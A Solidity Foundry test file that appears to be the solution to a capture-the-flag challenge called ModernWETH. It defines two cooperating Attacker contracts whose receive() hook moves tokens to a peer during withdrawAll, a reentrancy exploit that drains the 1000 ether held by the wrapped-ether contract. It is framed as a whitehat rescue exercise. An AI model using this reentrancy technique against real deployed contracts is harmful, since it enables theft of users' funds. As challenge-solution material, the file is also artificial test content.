// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {ModernWETH} from "../src/2_ModernWETH/ModernWETH.sol";

contract Attacker {
    ModernWETH modernWETH;
    Attacker attackPeer;
    address payable whitehat;

    constructor(ModernWETH _modernWETH, address payable _whitehat) {
        modernWETH = _modernWETH;
        whitehat = _whitehat;
    }

    function init() public payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        modernWETH.deposit{value: 1 ether}();
        modernWETH.withdrawAll();
    }

    function attack() external {
        modernWETH.withdrawAll();
    }

    function setAttackPeer(Attacker _attackPeer) external {
        attackPeer = _attackPeer;
    }

    function sendToEOA() external {
        (bool success, ) = whitehat.call{value: address(this).balance}("");
        require(success, "mWETH: ETH transfer failed");
    }

    receive() external payable {
        if (address(modernWETH).balance != 0 ether) {
            modernWETH.transfer(
                address(attackPeer),
                modernWETH.balanceOf(address(this))
            );
        }
    }
}

/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge2Test is Test {
    ModernWETH public modernWETH;
    address public whitehat = makeAddr("whitehat");
    Attacker attacker1;
    Attacker attacker2;

    function setUp() public {
        modernWETH = new ModernWETH();

        /// @dev contract has locked 1000 ether, deposited by a whale, you must rescue it
        address whale = makeAddr("whale");
        vm.deal(whale, 1000 ether);
        vm.prank(whale);
        modernWETH.deposit{value: 1000 ether}();

        /// @dev you, the whitehat, start with 10 ether
        vm.deal(whitehat, 10 ether);
    }

    function testWhitehatRescue() public {
        vm.startPrank(whitehat, whitehat);

        attacker1 = new Attacker(modernWETH, payable(whitehat));
        attacker2 = new Attacker(modernWETH, payable(whitehat));

        attacker1.setAttackPeer(attacker2);
        attacker2.setAttackPeer(attacker1);

        attacker1.init{value: 1 ether}();

        bool toogle = false;

        while (address(modernWETH).balance > 0 ether) {
            if (toogle) {
                attacker2.attack();
            } else {
                attacker1.attack();
            }

            toogle = !toogle;
        }

        attacker1.sendToEOA();
        attacker2.sendToEOA();

        vm.stopPrank();

        assertEq(
            address(modernWETH).balance,
            0,
            "ModernWETH balance should be 0"
        );
        // @dev whitehat should have more than 1000 ether plus 10 ether from initial balance after the rescue
        assertEq(
            address(whitehat).balance,
            1010 ether,
            "whitehat should end with 1010 ether"
        );
    }
}
